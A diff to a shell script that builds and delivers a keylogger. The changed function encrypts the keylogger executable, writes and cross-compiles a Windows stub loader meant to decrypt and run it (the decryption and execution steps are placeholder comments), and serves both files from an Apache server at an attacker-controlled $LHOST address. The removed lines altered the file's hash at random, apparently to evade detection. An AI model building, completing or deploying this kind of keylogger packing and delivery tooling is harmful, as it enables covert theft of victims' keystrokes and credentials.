@@ -35,18 +35,35 @@ generate_keylogger() {
   echo "Encrypting the executable..."
   openssl enc -aes-256-cbc -salt -in keylogger.exe -out keylogger.enc -pass pass:YourPasswordHere
 
-  echo "Modifying the hash of the encrypted file randomly..."
-  echo "$(date +%s) $(head -c 20 /dev/urandom | base64)" >> keylogger.enc
+  echo "Creating the stub loader..."
+  cat <<EOF >loader.cpp
+#include <Windows.h>
+#include <fstream>
 
-  echo "Compilation, encryption, and hash modification completed. The encrypted keylogger is keylogger.enc"
+int main() {
+    std::ifstream encFile("keylogger.enc", std::ios::binary);
+    std::string encrypted((std::istreambuf_iterator<char>(encFile)), std::istreambuf_iterator<char>());
+    // Decryption logic goes here
 
-  echo "Moving the encrypted keylogger to the Apache server directory..."
+    // Execute the decrypted payload
+    // Execution logic goes here
+
+    return 0;
+}
+EOF
+
+  x86_64-w64-mingw32-g++ loader.cpp -o final_keylogger.exe -static-libgcc -static-libstdc++
+
+  echo "Stub loader created. The final executable is final_keylogger.exe"
+
+  echo "Moving the final executable and encrypted payload to the Apache server directory..."
+  sudo mv final_keylogger.exe /var/www/html/
   sudo mv keylogger.enc /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The encrypted keylogger is available at: http://$LHOST/keylogger.enc"
+  echo "The final executable and encrypted payload are available at: http://$LHOST/final_keylogger.exe and http://$LHOST/keylogger.enc"
 }
 
 # Function to start the Python server
